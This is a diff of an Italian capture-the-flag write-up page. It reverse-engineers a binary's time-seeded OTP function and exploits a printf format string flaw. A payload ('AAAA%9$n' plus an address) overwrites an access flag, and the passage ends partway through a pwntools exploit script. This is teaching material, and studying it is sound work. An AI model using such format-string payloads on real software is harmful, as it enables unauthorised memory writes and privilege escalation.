-     <span class="n">push</span> <span class="n">ebx</span>                                           
-     <span class="n">esp</span> <span class="o">-=</span> <span class="mh">0x14</span>                                        
-     <span class="n">sym</span><span class="p">.</span><span class="n">__x86</span><span class="p">.</span><span class="n">get_pc_thunk</span><span class="p">.</span><span class="n">bx</span> <span class="p">()</span> <span class="p">;[</span><span class="mi">1</span><span class="p">]</span>                  
-     <span class="n">ebx</span> <span class="o">+=</span> <span class="mh">0x2bd4</span>            <span class="c1">//obj._GLOBAL_OFFSET_TABLE
-</span><span class="c1"></span>     <span class="n">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>                                         
-     <span class="n">push</span> <span class="mi">0</span>                                             
-     <span class="n">time_t</span> <span class="n">time</span><span class="p">(</span><span class="o">?</span><span class="p">)</span>           <span class="p">;[</span><span class="mi">2</span><span class="p">]</span>                      
-                             <span class="c1">//sym.imp.time ()          
-</span><span class="c1"></span>     <span class="n">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>                                        
-     <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span> <span class="o">=</span> <span class="n">eax</span>                              
-     <span class="n">eax</span> <span class="o">=</span> <span class="n">dword</span> <span class="p">[</span><span class="n">arg_8h</span><span class="p">]</span>     <span class="c1">//[0x8:4]=-1 ; 8          
-</span><span class="c1"></span>     <span class="n">eax</span> <span class="o">=</span> <span class="n">byte</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>                                   
-     <span class="n">eax</span> <span class="o">=</span> <span class="n">al</span>                                           
-     <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span> <span class="o">+=</span> <span class="n">eax</span>                             
-     <span class="n">eax</span> <span class="o">=</span> <span class="n">dword</span> <span class="p">[</span><span class="n">arg_ch</span><span class="p">]</span>     <span class="c1">//[0xc:4]=-1 ; 12         
-</span><span class="c1"></span>     <span class="n">eax</span> <span class="o">=</span> <span class="n">byte</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>                                   
-     <span class="n">eax</span> <span class="o">=</span> <span class="n">al</span>                                           
-     <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span> <span class="o">+=</span> <span class="n">eax</span>                             
-     <span class="n">eax</span> <span class="o">=</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>                              
-     <span class="n">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>                                         
-     <span class="n">push</span> <span class="n">eax</span>                                           
-     <span class="kt">void</span> <span class="n">srand</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>           <span class="p">;[</span><span class="mi">3</span><span class="p">]</span>                      
-                            <span class="c1">//sym.imp.srand ()          
-</span><span class="c1"></span>     <span class="n">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>                                        
-     <span class="kt">int</span> <span class="n">rand</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>           <span class="p">;[</span><span class="mi">4</span><span class="p">]</span>                      
-                             <span class="c1">//sym.imp.rand ()          
-</span><span class="c1"></span>     <span class="n">edx</span> <span class="o">=</span> <span class="n">eax</span>                                          
-     <span class="n">var</span> <span class="o">=</span> <span class="n">edx</span> <span class="o">-</span> <span class="mh">0xffffffffffffffff</span>                     
-     <span class="n">setae</span> <span class="n">al</span>                                           
-     <span class="n">eax</span> <span class="o">=</span> <span class="n">al</span>                                           
-     <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">]</span> <span class="o">=</span> <span class="n">eax</span>                               
-     <span class="n">eax</span> <span class="o">=</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">]</span>                               
-     <span class="n">eax</span> <span class="o">~=</span> <span class="n">eax</span>                                         
-     <span class="n">edx</span> <span class="o">-=</span> <span class="n">eax</span>                                         
-     <span class="n">eax</span> <span class="o">=</span> <span class="n">edx</span>                                          
-     <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">]</span> <span class="o">=</span> <span class="n">eax</span>                               
-     <span class="n">eax</span> <span class="o">=</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">]</span>                               
-     <span class="n">ebx</span> <span class="o">=</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">]</span>                               
-     <span class="n">leave</span> <span class="c1">//ebp ; ebp
-</span><span class="c1"></span><span class="p">}</span></code></pre></div>
-<p>Che detto chiaramente è utile quanto non averlo.</p>
-
-<p>Ghidra invece traduce il tutto nel seguente pseudocodice (si noti che non ho modificato nulla):</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">genOTPcode</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_2</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="n">time_t</span> <span class="n">tVar1</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
-
-  <span class="n">tVar1</span> <span class="o">=</span> <span class="n">time</span><span class="p">((</span><span class="n">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
-  <span class="n">srand</span><span class="p">(</span><span class="n">tVar1</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">param_1</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">param_2</span><span class="p">);</span>
-  <span class="n">iVar2</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
-  <span class="k">return</span> <span class="n">iVar2</span> <span class="o">+</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-<span class="p">}</span></code></pre></div>
-<p>Ho quindi tradotto letteralmente in python il tutto:</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">genOTPcode</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="n">param_2</span><span class="p">):</span>
-  <span class="n">tVar1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
-
-  <span class="n">libc</span><span class="o">.</span><span class="n">srand</span><span class="p">(</span><span class="n">tVar1</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">param_1</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">param_2</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
-  <span class="n">iVar2</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">rand</span><span class="p">();</span>
-  <span class="k">return</span> <span class="n">iVar2</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span></code></pre></div>
-<p>E funziona, la funzione sopra riportata è in grado di fornire l&rsquo;OTP corretto, e mi ha fatto risparmiare l&rsquo;onere di dover tradurre il codice assembly riga per riga per risalire all&rsquo;algoritmo finale.</p>
-
-<p>Inserito il codice OTP corretto ci viene mostrato il seguente menu:</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Hello, test_account
+  <span class=n>libc</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>tVar1</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>param_1</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>param_2</span><span class=p>[</span><span class=mi>0</span><span class=p>]));</span>
+  <span class=n>iVar2</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>rand</span><span class=p>();</span>
+  <span class=k>return</span> <span class=n>iVar2</span> <span class=o>+</span> <span class=nb>int</span><span class=p>(</span><span class=n>iVar2</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span></code></pre></div><p>E funziona, la funzione sopra riportata è in grado di fornire l&rsquo;OTP corretto, e mi ha fatto risparmiare l&rsquo;onere di dover tradurre il codice assembly riga per riga per risalire all&rsquo;algoritmo finale.</p><p>Inserito il codice OTP corretto ci viene mostrato il seguente menu:</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>Hello, test_account
 [1] Read latest report
 [2] Set a station
 [3] TODO
-[4] Exit</code></pre></div>
-<p>Se proviamo la prima opzione riceviamo come output:</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">[-] Access denied!</code></pre></div>
-<p>Non abbiamo i privilegi per leggere il report, aka li dietro si cela la flag.</p>
-
-<p>L&rsquo;opzione 3 e 4 portano alla chiusura del programma, non rimane che la 2:</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">&gt; 2
+[4] Exit</code></pre></div><p>Se proviamo la prima opzione riceviamo come output:</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>[-] Access denied!</code></pre></div><p>Non abbiamo i privilegi per leggere il report, aka li dietro si cela la flag.</p><p>L&rsquo;opzione 3 e 4 portano alla chiusura del programma, non rimane che la 2:</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>&gt; 2
 Set station &gt; stazione_bella
-Station: stazione_bella</code></pre></div>
-<p>A differenza della funzione appena vista lo pseudocodice per questa opzione non viene tradotto altrettanto bene:</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">setStation</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="n">ssize_t</span> <span class="n">sVar1</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">local_30</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
+Station: stazione_bella</code></pre></div><p>A differenza della funzione appena vista lo pseudocodice per questa opzione non viene tradotto altrettanto bene:</p><div class=highlight><pre class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=nf>setStation</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+<span class=p>{</span>
+  <span class=n>ssize_t</span> <span class=n>sVar1</span><span class=p>;</span>
+  <span class=kt>int</span> <span class=n>in_GS_OFFSET</span><span class=p>;</span>
+  <span class=kt>char</span> <span class=n>local_30</span> <span class=p>[</span><span class=mi>32</span><span class=p>];</span>
+  <span class=kt>int</span> <span class=n>local_10</span><span class=p>;</span>
 
-  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
-  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Set station &gt; &#34;</span><span class="p">);</span>
-  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-  <span class="n">sVar1</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_30</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
-  <span class="n">local_30</span><span class="p">[</span><span class="n">sVar1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Station: &#34;</span><span class="p">);</span>
-  <span class="n">printf</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
-  <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">))</span> <span class="p">{</span>
-    <span class="n">__stack_chk_fail_local</span><span class="p">();</span>
-  <span class="p">}</span>
-  <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span></code></pre></div>
-<p>un problema che si nota fin da subito è l&rsquo;ultimo if, Ghidra in tale funzione (a differenza di quelle analizzate prima) non è stato in grado di rimuovere la funzione <em>__stack_chk_fail_local</em>, che in pratica è il check dei canary. Poco male, il tool ci permette di mettere mano noi stessi allo pseudocodice al fine di renderlo più leggibile:</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">setStation</span><span class="p">()</span>
-<span class="p">{</span>
-  <span class="n">ssize_t</span> <span class="n">inputLen</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">input</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class=n>local_10</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_GS_OFFSET</span> <span class=o>+</span> <span class=mh>0x14</span><span class=p>);</span>
+  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Set station &gt; &#34;</span><span class=p>);</span>
+  <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
+  <span class=n>sVar1</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>local_30</span><span class=p>,</span><span class=mh>0x20</span><span class=p>);</span>
+  <span class=n>local_30</span><span class=p>[</span><span class=n>sVar1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Station: &#34;</span><span class=p>);</span>
+  <span class=n>printf</span><span class=p>(</span><span class=n>local_30</span><span class=p>);</span>
+  <span class=n>putchar</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span>
+  <span class=k>if</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>!=</span> <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_GS_OFFSET</span> <span class=o>+</span> <span class=mh>0x14</span><span class=p>))</span> <span class=p>{</span>
+    <span class=n>__stack_chk_fail_local</span><span class=p>();</span>
+  <span class=p>}</span>
+  <span class=k>return</span><span class=p>;</span>
+<span class=p>}</span></code></pre></div><p>un problema che si nota fin da subito è l&rsquo;ultimo if, Ghidra in tale funzione (a differenza di quelle analizzate prima) non è stato in grado di rimuovere la funzione <em>__stack_chk_fail_local</em>, che in pratica è il check dei canary. Poco male, il tool ci permette di mettere mano noi stessi allo pseudocodice al fine di renderlo più leggibile:</p><div class=highlight><pre class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=nf>setStation</span><span class=p>()</span>
+<span class=p>{</span>
+  <span class=n>ssize_t</span> <span class=n>inputLen</span><span class=p>;</span>
+  <span class=kt>char</span> <span class=n>input</span> <span class=p>[</span><span class=mi>32</span><span class=p>];</span>
 
-  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Set station &gt; &#34;</span><span class="p">);</span>
-  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Set station &gt; &#34;</span><span class=p>);</span>
+  <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
 
-  <span class="n">inputLen</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">input</span><span class="p">,</span><span class="mi">32</span><span class="p">);</span>
-  <span class="n">input</span><span class="p">[</span><span class="n">inputLen</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class=n>inputLen</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>input</span><span class=p>,</span><span class=mi>32</span><span class=p>);</span>
+  <span class=n>input</span><span class=p>[</span><span class=n>inputLen</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
 
-  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Station: &#34;</span><span class="p">);</span>
-  <span class="n">printf</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
-  <span class="n">putchar</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
+  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Station: &#34;</span><span class=p>);</span>
+  <span class=n>printf</span><span class=p>(</span><span class=n>input</span><span class=p>);</span>
+  <span class=n>putchar</span><span class=p>(</span><span class=sc>&#39;\n&#39;</span><span class=p>);</span>
 
-  <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span></code></pre></div>
-<p>La funzione semplicemente legge una stringa, aggiunge il terminatore e la stampa tramite <code>printf(input)</code> questa istruzione sarebbe dovuta essere <code>printf(&quot;%s&quot;,input)</code>, così com&rsquo;è risulta soggetta ad un format string attack. Ed è proprio il tipo di attacco che useremo per elevare i privilegi del nostro account.</p>
+  <span class=k>return</span><span class=p>;</span>
+<span class=p>}</span></code></pre></div><p>La funzione semplicemente legge una stringa, aggiunge il terminatore e la stampa tramite <code>printf(input)</code> questa istruzione sarebbe dovuta essere <code>printf(&quot;%s&quot;,input)</code>, così com&rsquo;è risulta soggetta ad un format string attack. Ed è proprio il tipo di attacco che useremo per elevare i privilegi del nostro account.</p><p>Lo pseudocodice di Ghidra per la prima opzione del menu è il seguente:</p><div class=highlight><pre class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=nf>readLastReport</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+<span class=p>{</span>
+  <span class=k>if</span> <span class=p>(</span><span class=n>flag</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[-] Access denied!&#34;</span><span class=p>);</span>
+  <span class=p>}</span>
+  <span class=k>else</span> <span class=p>{</span>
+    <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/cat report.txt&#34;</span><span class=p>);</span>
+  <span class=p>}</span>
+  <span class=n>putchar</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span>
+  <span class=k>return</span><span class=p>;</span>
+<span class=p>}</span></code></pre></div><p>L&rsquo;idea è quella di sovrascrivere il valore di flag (di default a 0) in modo da stampare il contenuto di <em>report.txt</em>.</p><p>Semplicemente cliccando con il cursore sopra la variabile flag ci viene mostrato che essa si trova all&rsquo;indirizzo <em>0x0804c058</em>.</p><p>Qui sorge però un grosso problema con Ghidra: per eseguire un format string attack dobbiamo conoscere lo stato dello stack nel momento in cui la printf viene richiamata. Ghidra permette solo l&rsquo;analisi statica dell&rsquo;eseguibile, non possiamo quindi usarlo per debuggare il codice in tempo reale. Si passa dunque a radare2.</p><p>Dato come input <em>AAAA</em> lo stato dello stack prima della printf è il seguente:</p><div class=highlight><pre class=chroma><code class=language-nasm data-lang=nasm><span class=err>0</span><span class=nf>xff852e00</span>  <span class=mh>0xff852e1c</span>  <span class=nv>....</span> <span class=err>@</span><span class=nb>esp</span> <span class=nb>eax</span> <span class=nv>stack</span> <span class=nv>R</span> <span class=nv>W</span> <span class=mh>0x41414141</span> <span class=p>(</span><span class=nv>AAAA</span><span class=p>)</span> <span class=o>--&gt;</span>  <span class=nv>ascii</span>                                                                                                                                                                                                
+<span class=err>0</span><span class=nf>xff852e04</span>  <span class=mh>0xff852e1c</span>  <span class=nv>....</span> <span class=nb>eax</span> <span class=nv>stack</span> <span class=nv>R</span> <span class=nv>W</span> <span class=mh>0x41414141</span> <span class=p>(</span><span class=nv>AAAA</span><span class=p>)</span> <span class=o>--&gt;</span>  <span class=nv>ascii</span>                                                                                                                                                                     
+<span class=err>0</span><span class=nf>xff852e08</span>  <span class=mh>0x00000020</span>   <span class=nv>...</span> <span class=p>(</span><span class=nv>.symtab</span><span class=p>)</span> <span class=nv>ascii</span>                                                                             
+<span class=err>0</span><span class=nf>xff852e0c</span>  <span class=mh>0x080494cd</span>  <span class=nv>....</span> <span class=p>(</span><span class=nv>.text</span><span class=p>)</span> <span class=p>(</span><span class=o>/</span><span class=nv>home</span><span class=o>/</span><span class=nv>tau</span><span class=o>/</span><span class=nv>Downloads</span><span class=o>/</span><span class=nv>fc</span><span class=o>/</span><span class=nv>ns</span><span class=p>)</span> <span class=nv>sym.setStation</span> <span class=nv>program</span> <span class=nv>R</span> <span class=nv>X</span> <span class=s>&#39;add ebx, 0x2b33&#39;</span> <span class=s>&#39;ns&#39;</span>
+<span class=err>0</span><span class=nf>xff852e10</span>  <span class=mh>0xf7ecad40</span>  <span class=err>@</span><span class=nv>...</span> <span class=p>(</span><span class=o>/</span><span class=nv>usr</span><span class=o>/</span><span class=nv>lib32</span><span class=o>/</span><span class=nv>libc</span><span class=o>-</span><span class=mf>2.28</span><span class=nv>.so</span><span class=p>)</span> <span class=nv>library</span> <span class=nv>R</span> <span class=nv>W</span> <span class=mh>0xfbad2a84</span>
+<span class=err>0</span><span class=nf>xff852e14</span>  <span class=mh>0xf7ec9e24</span>  <span class=kc>$</span><span class=nv>...</span> <span class=p>(</span><span class=o>/</span><span class=nv>usr</span><span class=o>/</span><span class=nv>lib32</span><span class=o>/</span><span class=nv>libc</span><span class=o>-</span><span class=mf>2.28</span><span class=nv>.so</span><span class=p>)</span> <span class=nb>edi</span> <span class=nv>library</span> <span class=nv>R</span> <span class=mh>0x1d8d2c</span>
+<span class=err>0</span><span class=nf>xff852e18</span>  <span class=mh>0x00000005</span>  <span class=nv>....</span> <span class=p>(</span><span class=nv>.comment</span><span class=p>)</span>
+<span class=err>0</span><span class=nf>xff852e1c</span>  <span class=mh>0x41414141</span>  <span class=nv>AAAA</span> <span class=err>@</span><span class=nb>eax</span> <span class=nv>ascii</span> <span class=nv>return</span>  </code></pre></div><p>L&rsquo;input si trova ad 8 righe (indirizzi) dall&rsquo;inizio dello stack, quindi se passo come parametro:</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>&#34;AAAA%9$n&#34;+p32(0x0804c058)</code></pre></div><p>Verrà posto il valore 4 in <em>flag</em>.</p><p>Il codice finale è il seguente:</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>CDLL</span>
+<span class=kn>from</span> <span class=nn>math</span> <span class=kn>import</span> <span class=n>floor</span>
+<span class=kn>import</span> <span class=nn>time</span>
 
-<p>Lo pseudocodice di Ghidra per la prima opzione del menu è il seguente:</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">readLastReport</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Access denied!&#34;</span><span class="p">);</span>
-  <span class="p">}</span>
-  <span class="k">else</span> <span class="p">{</span>
-    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat report.txt&#34;</span><span class="p">);</span>
-  <span class="p">}</span>
-  <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
-  <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span></code></pre></div>
-<p>L&rsquo;idea è quella di sovrascrivere il valore di flag (di default a 0) in modo da stampare il contenuto di <em>report.txt</em>.</p>
+<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 
-<p>Semplicemente cliccando con il cursore sopra la variabile flag ci viene mostrato che essa si trova all&rsquo;indirizzo <em>0x0804c058</em>.</p>
+<span class=n>libc</span> <span class=o>=</span> <span class=n>CDLL</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>)</span>
 
-<p>Qui sorge però un grosso problema con Ghidra: per eseguire un format string attack dobbiamo conoscere lo stato dello stack nel momento in cui la printf viene richiamata. Ghidra permette solo l&rsquo;analisi statica dell&rsquo;eseguibile, non possiamo quindi usarlo per debuggare il codice in tempo reale. Si passa dunque a radare2.</p>
+<span class=k>def</span> <span class=nf>genOTPcode</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=n>param_2</span><span class=p>):</span>
+  <span class=n>tVar1</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span>
 
-<p>Dato come input <em>AAAA</em> lo stato dello stack prima della printf è il seguente:</p>
-<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="err">0</span><span class="nf">xff852e00</span>  <span class="mh">0xff852e1c</span>  <span class="nv">....</span> <span class="err">@</span><span class="nb">esp</span> <span class="nb">eax</span> <span class="nv">stack</span> <span class="nv">R</span> <span class="nv">W</span> <span class="mh">0x41414141</span> <span class="p">(</span><span class="nv">AAAA</span><span class="p">)</span> <span class="o">--&gt;</span>  <span class="nv">ascii</span>                                                                                                                                                                                                
-<span class="err">0</span><span class="nf">xff852e04</span>  <span class="mh">0xff852e1c</span>  <span class="nv">....</span> <span class="nb">eax</span> <span class="nv">stack</span> <span class="nv">R</span> <span class="nv">W</span> <span class="mh">0x41414141</span> <span class="p">(</span><span class="nv">AAAA</span><span class="p">)</span> <span class="o">--&gt;</span>  <span class="nv">ascii</span>                                                                                                                                                                     
-<span class="err">0</span><span class="nf">xff852e08</span>  <span class="mh">0x00000020</span>   <span class="nv">...</span> <span class="p">(</span><span class="nv">.symtab</span><span class="p">)</span> <span class="nv">ascii</span>                                                                             
-<span class="err">0</span><span class="nf">xff852e0c</span>  <span class="mh">0x080494cd</span>  <span class="nv">....</span> <span class="p">(</span><span class="nv">.text</span><span class="p">)</span> <span class="p">(</span><span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">tau</span><span class="o">/</span><span class="nv">Downloads</span><span class="o">/</span><span class="nv">fc</span><span class="o">/</span><span class="nv">ns</span><span class="p">)</span> <span class="nv">sym.setStation</span> <span class="nv">program</span> <span class="nv">R</span> <span class="nv">X</span> <span class="s">&#39;add ebx, 0x2b33&#39;</span> <span class="s">&#39;ns&#39;</span>
-<span class="err">0</span><span class="nf">xff852e10</span>  <span class="mh">0xf7ecad40</span>  <span class="err">@</span><span class="nv">...</span> <span class="p">(</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib32</span><span class="o">/</span><span class="nv">libc</span><span class="o">-</span><span class="mf">2.28</span><span class="nv">.so</span><span class="p">)</span> <span class="nv">library</span> <span class="nv">R</span> <span class="nv">W</span> <span class="mh">0xfbad2a84</span>
-<span class="err">0</span><span class="nf">xff852e14</span>  <span class="mh">0xf7ec9e24</span>  <span class="kc">$</span><span class="nv">...</span> <span class="p">(</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib32</span><span class="o">/</span><span class="nv">libc</span><span class="o">-</span><span class="mf">2.28</span><span class="nv">.so</span><span class="p">)</span> <span class="nb">edi</span> <span class="nv">library</span> <span class="nv">R</span> <span class="mh">0x1d8d2c</span>
-<span class="err">0</span><span class="nf">xff852e18</span>  <span class="mh">0x00000005</span>  <span class="nv">....</span> <span class="p">(</span><span class="nv">.comment</span><span class="p">)</span>
-<span class="err">0</span><span class="nf">xff852e1c</span>  <span class="mh">0x41414141</span>  <span class="nv">AAAA</span> <span class="err">@</span><span class="nb">eax</span> <span class="nv">ascii</span> <span class="nv">return</span>  </code></pre></div>
-<p>L&rsquo;input si trova ad 8 righe (indirizzi) dall&rsquo;inizio dello stack, quindi se passo come parametro:</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">&#34;AAAA%9$n&#34;+p32(0x0804c058)</code></pre></div>
-<p>Verrà posto il valore 4 in <em>flag</em>.</p>
+  <span class=n>libc</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>tVar1</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>param_1</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>param_2</span><span class=p>[</span><span class=mi>0</span><span class=p>]));</span>
+  <span class=n>iVar2</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>rand</span><span class=p>();</span>
+  <span class=k>return</span> <span class=n>iVar2</span> <span class=o>+</span> <span class=nb>int</span><span class=p>(</span><span class=n>iVar2</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
 
-<p>Il codice finale è il seguente:</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
-<span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">floor</span>
-<span class="kn">import</span> <span class="nn">time</span>
+<span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;test_account&#34;</span>
+<span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;test_password&#34;</span>
 
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class=n>adminFlag</span> <span class=o>=</span> <span class=mh>0x0804c058</span>
 
-<span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="s1">&#39;libc.so.6&#39;</span><span class="p">)</span>
